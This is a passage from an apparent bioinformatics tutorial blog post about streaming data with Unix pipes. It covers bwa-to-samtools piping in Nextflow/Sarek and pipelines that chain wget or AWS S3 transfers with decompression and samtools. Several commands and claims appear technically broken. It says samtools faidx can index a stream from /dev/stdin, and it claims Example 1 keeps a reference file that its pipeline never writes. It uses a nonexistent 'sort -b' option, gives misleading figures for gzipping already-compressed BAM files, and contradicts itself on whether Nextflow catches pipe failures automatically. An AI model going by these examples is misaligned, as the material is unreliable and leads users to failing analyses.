<p><strong>Pipe (|)</strong> connects output directly to samtools</p>
<ul>
<li class="">Data streams from bwa to samtools in memory</li>
<li class="">No intermediate SAM file created</li>
<li class="">Constant memory usage regardless of dataset size</li>
</ul>
</li>
<li class="">
<p><strong>samtools sort/view</strong> processes the SAM stream</p>
<ul>
<li class="">Either sorts (if <code>sort_bam=true</code>) or just converts format</li>
<li class="">Final output directly to <code>.bam</code>, <code>.cram</code>, or <code>.sam</code></li>
<li class="">Uses <code>--threads $task.cpus</code> to parallelize efficiently</li>
</ul>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="benefits-in-this-real-workflow">Benefits in This Real Workflow<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#benefits-in-this-real-workflow" class="hash-link" aria-label="Direct link to Benefits in This Real Workflow" title="Direct link to Benefits in This Real Workflow" translate="no">​</a></h3>
<p>For a <strong>human whole-genome sequencing run</strong> (~100GB raw reads):</p>
<p><strong>Without pipes (hypothetical):</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem $INDEX $reads &gt; aligned.sam      # 500+ GB intermediate</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools sort aligned.sam &gt; sorted.bam   # 100+ GB final</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">rm aligned.sam</span><br></span></code></pre></div></div>
<ul>
<li class="">Storage needed: 600+ GB</li>
<li class="">Disk I/O: Read 100GB (bwa) + Write 500GB (SAM) + Read 500GB (samtools) = 1.1TB of I/O</li>
<li class="">Time: Significantly slower due to I/O contention</li>
</ul>
<p><strong>With pipes (Sarek approach):</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem $INDEX $reads | samtools sort -o sorted.bam -</span><br></span></code></pre></div></div>
<ul>
<li class="">Storage needed: 100 GB (final output only)</li>
<li class="">Disk I/O: Read 100GB (bwa input) + Write 100GB (final BAM) = 200GB of I/O</li>
<li class="">Time: 2-5x faster due to eliminated intermediate I/O</li>
<li class="">Memory: Constant (~2-3GB) regardless of genome size</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="flexibility-through-arguments">Flexibility Through Arguments<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#flexibility-through-arguments" class="hash-link" aria-label="Direct link to Flexibility Through Arguments" title="Direct link to Flexibility Through Arguments" translate="no">​</a></h3>
<p>The Sarek process demonstrates production-grade flexibility:</p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> samtools_command </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> sort_bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'sort'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'view'</span><br></span></code></pre></div></div>
<p>This single line allows switching between:</p>
<ul>
<li class=""><strong>Sorting in the pipeline</strong> (slower but sorted output)</li>
<li class=""><strong>No sorting</strong> (faster, relies on downstream tools)</li>
</ul>
<p>And the extension can be dynamically chosen:</p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> extension </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"--output-fmt cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"bam"</span><br></span></code></pre></div></div>
<p>This means the <strong>same process</strong> can output BAM, CRAM, or SAM depending on configuration—all using the same efficient pipe pattern.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="error-handling-in-nextflow-processes">Error Handling in Nextflow Processes<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#error-handling-in-nextflow-processes" class="hash-link" aria-label="Direct link to Error Handling in Nextflow Processes" title="Direct link to Error Handling in Nextflow Processes" translate="no">​</a></h3>
<p>Nextflow automatically handles pipe failures. If any command in the chain fails:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">. </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">.  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># If either fails, Nextflow catches it</span><br></span></code></pre></div></div>
<p>The entire task is marked as failed, and error logs are captured. This is superior to manual bash scripts where errors can be silent.</p>
<p><strong>To ensure pipeline stops on any error,</strong> include at the top of your Nextflow script:</p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    shell </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'/bin/bash'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-euo'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'pipefail'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// -o pipefail catches pipe errors</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p>This ensures that if bwa fails and outputs nothing, samtools will detect it as an error rather than silently succeeding on empty input.</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="pipes-for-download-upload-and-cloud-storage">Pipes for Download, Upload, and Cloud Storage<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#pipes-for-download-upload-and-cloud-storage" class="hash-link" aria-label="Direct link to Pipes for Download, Upload, and Cloud Storage" title="Direct link to Pipes for Download, Upload, and Cloud Storage" translate="no">​</a></h2>
<p>One of the most practical uses of pipes in bioinformatics is combining download/upload tools with data processing, eliminating intermediate files entirely. This is especially valuable when working with cloud storage like AWS S3.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-1-download--decompress--process-no-temp-files">Example 1: Download → Decompress → Process (No Temp Files)<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-1-download--decompress--process-no-temp-files" class="hash-link" aria-label="Direct link to Example 1: Download → Decompress → Process (No Temp Files)" title="Direct link to Example 1: Download → Decompress → Process (No Temp Files)" translate="no">​</a></h3>
<p><strong>Scenario:</strong> You need to download a compressed reference genome from a public server, decompress it, and index it—all without storing the compressed file.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Traditional approach (❌ Wasteful)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> https://example.com/reference.fasta.gz  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Downloads 5GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">gunzip reference.fasta.gz                     </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Decompresses to 15GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools faidx reference.fasta                </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Index the reference</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> reference.fasta                            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cleanup takes time</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total disk space needed: 20GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pipe approach (✓ Efficient)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> - https://example.com/reference.fasta.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  gunzip </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools faidx /dev/stdin</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total disk space needed: 15GB (final reference only)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># No temporary files, no cleanup needed</span><br></span></code></pre></div></div>
<p><strong>What happens:</strong></p>
<ol>
<li class=""><code>wget -O -</code> downloads to stdout (not to disk)</li>
<li class=""><code>gunzip</code> decompresses the stream on-the-fly</li>
<li class=""><code>samtools faidx /dev/stdin</code> creates the index directly from the stream</li>
<li class="">Final reference file and index stored without intermediate compressed file</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-2-process--compress--upload-to-s3-single-pipeline">Example 2: Process → Compress → Upload to S3 (Single Pipeline)<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-2-process--compress--upload-to-s3-single-pipeline" class="hash-link" aria-label="Direct link to Example 2: Process → Compress → Upload to S3 (Single Pipeline)" title="Direct link to Example 2: Process → Compress → Upload to S3 (Single Pipeline)" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Process sequencing data and upload the compressed results directly to AWS S3 without creating local compressed files.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Traditional approach (❌ Wasteful)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem reference.fa reads.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> aligned.bam -</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> aligned.bam                           </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Creates aligned.bam.gz (100+ GB)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> aligned.bam.gz s3://my-bucket/  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Upload</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> aligned.bam.gz                          </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cleanup</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total disk space: 200+ GB (original BAM + compressed file)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pipe approach (✓ Efficient)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem reference.fa reads.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> - </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> - s3://my-bucket/aligned.bam.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total disk space: 0 GB temporary files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compressed data uploaded directly to S3</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Only stores the final index or metadata files locally</span><br></span></code></pre></div></div>
<p><strong>What happens:</strong></p>
<ol>
<li class=""><code>bwa mem</code> and <code>samtools sort</code> chain together (as before)</li>
<li class=""><code>gzip</code> compresses the BAM stream on-the-fly</li>
<li class=""><code>aws s3 cp -</code> uploads directly from stdin to S3</li>
<li class="">Data never exists uncompressed on disk</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-3-download-from-s3--decompress--analyze-no-local-copy">Example 3: Download from S3 → Decompress → Analyze (No Local Copy)<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-3-download-from-s3--decompress--analyze-no-local-copy" class="hash-link" aria-label="Direct link to Example 3: Download from S3 → Decompress → Analyze (No Local Copy)" title="Direct link to Example 3: Download from S3 → Decompress → Analyze (No Local Copy)" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Analyze BAM files stored in S3 without downloading the entire uncompressed file locally.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Traditional approach (❌ Wasteful)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> s3://my-bucket/sample.bam.gz </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain">   </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Download 50GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">gunzip sample.bam.gz                        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Decompress to 150GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools flagstat sample.bam                </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Analyze</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Local disk: 200GB, slow downloads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pipe approach (✓ Efficient)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> s3://my-bucket/sample.bam.gz - </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  gunzip </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools flagstat /dev/stdin</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Local disk: 0 GB temporary files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Stream analysis, no storage overhead</span><br></span></code></pre></div></div>
<p><strong>What happens:</strong></p>
<ol>
<li class=""><code>aws s3 cp - s3://...</code> downloads from S3 to stdout</li>
<li class=""><code>gunzip</code> decompresses the stream</li>
<li class=""><code>samtools flagstat</code> reads and analyzes directly from the pipe</li>
<li class="">Only metadata (flagstat results) stored locally</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-4-download-tarball--extract--index-no-intermediate-files">Example 4: Download Tarball → Extract → Index (No Intermediate Files)<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-4-download-tarball--extract--index-no-intermediate-files" class="hash-link" aria-label="Direct link to Example 4: Download Tarball → Extract → Index (No Intermediate Files)" title="Direct link to Example 4: Download Tarball → Extract → Index (No Intermediate Files)" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Download a compressed archive of reference sequences, extract, and index—all in one pipeline.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Traditional approach (❌ Wasteful)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> https://example.com/genomes.tar.gz    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 10GB download</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-xzf</span><span class="token plain"> genomes.tar.gz                     </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extracts to 50GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">ref</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> genomes/*.fasta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools faidx </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$ref</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> genomes.tar.gz genomes/              </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cleanup</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Disk space: 60GB temporary files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pipe approach (✓ Efficient)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> - https://example.com/genomes.tar.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-xz</span><span class="token plain"> --to-stdout </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">while</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">read</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-r</span><span class="token plain"> line</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$line</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> current_genome.fasta</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$line</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=~</span><span class="token plain"> ^</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> current_genome.fasta </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      samtools faidx current_genome.fasta</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 